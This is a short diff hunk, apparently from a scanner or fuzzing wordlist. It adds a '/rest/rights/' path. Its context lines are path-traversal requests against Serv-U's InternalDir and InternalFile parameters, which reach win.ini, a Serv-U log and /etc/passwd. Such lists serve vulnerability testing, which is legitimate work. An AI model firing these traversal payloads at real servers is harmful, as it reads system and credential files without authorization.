@@ -62,3 +62,4 @@
 /?InternalDir=../../../../../Windows&InternalFile=win.ini
 /?InternalDir=\\..\\..\\..\\..\\usr\\local\\Serv-U&InternalFile=Serv-U-StartupLog.txt
 /?InternalDir=\\..\\..\\..\\..\\etc&InternalFile=passwd
+/rest/rights/
